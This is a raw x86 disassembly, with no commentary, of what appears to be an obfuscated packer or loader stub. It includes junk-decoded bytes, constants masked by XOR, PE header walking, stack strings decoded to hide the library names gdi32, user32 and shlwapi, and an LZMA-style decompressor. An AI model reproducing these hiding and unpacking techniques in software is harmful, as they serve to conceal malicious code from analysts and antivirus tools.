  41f79a:	mov    edx,0x3b6720c1
  41f79f:	and    BYTE PTR [ebp+0x54],ah
  41f7a2:	jo     0x41f731
  41f7a4:	bound  esp,QWORD PTR [eax+0x168ccdb2]
  41f7aa:	and    DWORD PTR [ebp-0x33],ebx
  41f7ad:	je     0x41f74e
  41f7af:	lods   al,BYTE PTR ds:[esi]
  41f7b0:	test   WORD PTR [eax+0x2d6c91af],0xc9f9
  41f7b9:	or     eax,0x69d909dd
  41f7be:	push   es
  41f7bf:	rcl    DWORD PTR [ebx-0x1],cl
  41f7c2:	mov    dl,0x6e
  41f7c4:	push   cs
  41f7c5:	sub    al,BYTE PTR [eax]
  41f7c7:	jno    0x41f7d0
  41f7c9:	js     0x41f78a
  41f7cb:	or     bl,dl
  41f7cd:	stos   DWORD PTR es:[edi],eax
  41f7ce:	fidiv  WORD PTR [edx+0x16215b1e]
  41f7d4:	pushf  
  41f7d5:	add    esp,DWORD PTR ds:0xf0fb3b33
  41f7db:	test   BYTE PTR [eax+0x2f3b07db],0x0
  41f7e2:	in     eax,dx
  41f7e3:	pop    eax
  41f7e4:	mov    ebx,0x543764ba
  41f7e9:	mov    bl,0xb1
  41f7eb:	lock jl 0x41f7f9
  41f7ee:	leave  
  41f7ef:	mov    al,ds:0xdc2e8f4d
  41f7f4:	dec    eax
  41f7f5:	les    esi,FWORD PTR [ecx-0x29fdb60a]
  41f7fb:	das    
  41f7fc:	mov    eax,ds:0xabf62d77
  41f801:	sbb    al,0x44
  41f803:	and    cl,BYTE PTR [esi+0x70]
  41f806:	sub    BYTE PTR [ecx],0xcc
  41f809:	data16 gs out dx,al
  41f80c:	pushf  
  41f80d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f80e:	int    0xb0
  41f810:	scas   al,BYTE PTR es:[edi]
  41f811:	lods   al,BYTE PTR ds:[esi]
  41f812:	mov    edx,0x20df4666
  41f817:	pushf  
  41f818:	in     al,0x2a
  41f81a:	xchg   ebx,eax
  41f81b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f81c:	stos   BYTE PTR es:[edi],al
  41f81d:	loop   0x41f873
  41f81f:	stos   DWORD PTR es:[edi],eax
  41f820:	hlt    
  41f821:	repz sbb al,0x63
  41f824:	leave  
  41f825:	inc    DWORD PTR [eax-0x23]
  41f828:	cmp    edx,esp
  41f82a:	and    BYTE PTR [esi],bl
  41f82c:	cmp    bh,BYTE PTR [eax+0x3d]
  41f82f:	fisubr WORD PTR [ebx+0xd4d673]
  41f835:	fistp  DWORD PTR [ebx]
  41f837:	mov    ebp,0xd165044e
  41f83c:	and    eax,0xadc34138
  41f841:	lea    esp,[eax-0x19]
  41f844:	mov    ds:0xa07bfdd3,al
  41f849:	ins    DWORD PTR es:[edi],dx
  41f84a:	inc    eax
  41f84b:	dec    edx
  41f84c:	iret   
  41f84d:	mov    ah,0xa
  41f84f:	pushf  
  41f850:	outs   dx,BYTE PTR ds:[esi]
  41f851:	pop    edx
  41f852:	enter  0x9650,0x1b
  41f856:	cmp    bl,BYTE PTR [edi+0x4d]
  41f859:	call   0x2020654a
  41f85e:	cld    
  41f85f:	sub    BYTE PTR [esi+0x77e2179c],ch
  41f865:	icebp  
  41f866:	aas    
  41f867:	pop    ebx
  41f868:	xor    ebx,DWORD PTR [edx+0x173fb48f]
  41f86e:	mov    bl,0xb0
  41f870:	sahf   
  41f871:	sub    al,0x2f
  41f873:	xchg   edi,eax
  41f874:	xchg   DWORD PTR [edx+0x3272fa],edi
  41f87a:	sub    eax,edx
  41f87c:	or     ecx,DWORD PTR ds:0x426eb9
  41f882:	mov    ecx,0x75108b3
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429d65
  41f8e9:	mov    edx,DWORD PTR ds:0x42af5d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x430a00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x430a40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	cmp    eax,0x364cb5fc
  41faa9:	add    BYTE PTR [eax-0x6cf57bb1],bl
  41faaf:	fcom   DWORD PTR [ecx+0x1f30b1c]
  41fab5:	add    BYTE PTR [eax],al
  41fab7:	add    BYTE PTR [ebx+0x3a],al
  41faba:	pop    esp
  41fabb:	inc    esi
  41fabc:	outs   dx,DWORD PTR ds:[esi]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
